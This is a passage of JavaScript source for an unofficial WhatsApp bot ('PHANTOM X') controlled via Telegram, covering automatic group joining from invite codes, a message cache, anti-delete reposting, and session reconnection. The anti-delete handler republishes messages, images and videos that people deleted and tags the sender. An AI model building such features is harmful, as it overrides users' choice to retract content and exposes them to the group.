            if (blacklist.some(b => ajText.toLowerCase().includes(b))) continue;
            try {
                await sock.groupAcceptInvite(ajCode);
                console.log(`[AutoJoin] Joined group via link code: ${ajCode}`);
            } catch (e) {
                console.log(`[AutoJoin] Failed to join ${ajCode}: ${e?.message}`);
            }
        }
    });

    // Store messages for antidelete lookup
    const msgCache = {};
    sock.ev.on("messages.upsert", ({ messages }) => {
        for (const m of messages) {
            if (m.key?.id && m.message) msgCache[m.key.id] = m;
        }
    });

    sock.ev.on("messages.delete", async (item) => {
        try {
            const keys = item.keys || (item.key ? [item.key] : []);
            for (const key of keys) {
                const groupJid = key.remoteJid;
                if (!groupJid?.endsWith("@g.us")) continue;
                if (!getGroupSetting(groupJid, "antidelete")) continue;
                const cached = msgCache[key.id];
                if (!cached?.message) continue;
                const type = getContentType(cached.message);
                const who = key.participant || cached.key?.participant;
                const whoNum = who ? `@${who.split("@")[0]}` : "Someone";
                try {
                    if (type === "conversation" || type === "extendedTextMessage") {
                        const txt = cached.message?.conversation || cached.message?.extendedTextMessage?.text || "";
                        if (txt) {
                            await sock.sendMessage(groupJid, {
                                text: `🗑️ *Deleted Message Caught!*\n👤 *From:* ${whoNum}\n\n📝 *Message:*\n${txt}`,
                                mentions: who ? [who] : [],
                            });
                        }
                    } else if (type === "imageMessage") {
                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
                        await sock.sendMessage(groupJid, {
                            image: buf,
                            caption: `🗑️ *Deleted image caught!* (Sent by ${whoNum})`,
                            mentions: who ? [who] : [],
                        });
                    } else if (type === "videoMessage") {
                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
                        await sock.sendMessage(groupJid, {
                            video: buf,
                            caption: `🗑️ *Deleted video caught!* (Sent by ${whoNum})`,
                            mentions: who ? [who] : [],
                        });
                    }
                } catch (_) {}
            }
        } catch (e) {
            console.error("[Antidelete]", e?.message);
        }
    });

    sock.ev.on("group-participants.update", async (update) => {
        await handleGroupUpdate(sock, update, ctx, botJids[userId]);
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
            retryCounts[userId] = 0;
            botJids[userId] = sock.user?.id || sock.user?.jid || null;
            telegramCtxs[userId] = ctx;
            // Save session so it auto-reconnects after restart
            saveSession(userId, phoneNumber, ctx.from?.id || userId);
            if (!isReconnect) {
                ctx.reply("🎊 WhatsApp Bot is now connected and LIVE!\n\nSend *.menu* on WhatsApp to see all commands.");
                // Send welcome message directly on WhatsApp (self-chat)
                try {
                    await delay(3000);
                    // Use number@s.whatsapp.net format for reliable self-message
                    const selfJid = (sock.user?.id || "").split(':')[0].split('@')[0] + "@s.whatsapp.net";
                    await sock.sendMessage(selfJid, {
                        text: `╔══════════════════════╗\n║  ✅  PHANTOM X LIVE  ✅  ║\n╚══════════════════════╝\n\n🔥 *Your bot is now CONNECTED!*\n\nYou can chat me here or use me in any group.\nType *.menu* to see all commands.\n━━━━━━━━━━━━━━━━━━━━`
                    });
                } catch (e) { console.error("Welcome WA msg error:", e?.message); }
            }
            console.log(`User ${userId} connected! Bot JID: ${botJids[userId]}`);
        }

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const reason = lastDisconnect?.error?.message || "unknown";
            console.log(`User ${userId} disconnected (${statusCode}): ${reason}`);

            const shouldNotReconnect = [
                DisconnectReason.loggedOut,
                DisconnectReason.forbidden,
                DisconnectReason.badSession,
                DisconnectReason.connectionReplaced,
            ].includes(statusCode);

            if (shouldNotReconnect) {
                delete activeSockets[userId];
                delete retryCounts[userId];
                deleteSession(userId);
                if (statusCode === DisconnectReason.loggedOut) {
                    clearAuthState(userId);
                    ctx.reply("⚠️ WhatsApp session ended. Use /pair to reconnect.");
                }
                return;
            }

            retryCounts[userId] = (retryCounts[userId] || 0) + 1;
            if (retryCounts[userId] > MAX_RETRIES) {
                delete activeSockets[userId];
                delete retryCounts[userId];
                ctx.reply("❌ Could not stay connected to WhatsApp. Please try /pair again.");
                return;
            }

            console.log(`User ${userId}: reconnecting (attempt ${retryCounts[userId]})...`);
            await delay(4000);
            startBot(userId, phoneNumber, ctx, true);
        }
    });
}
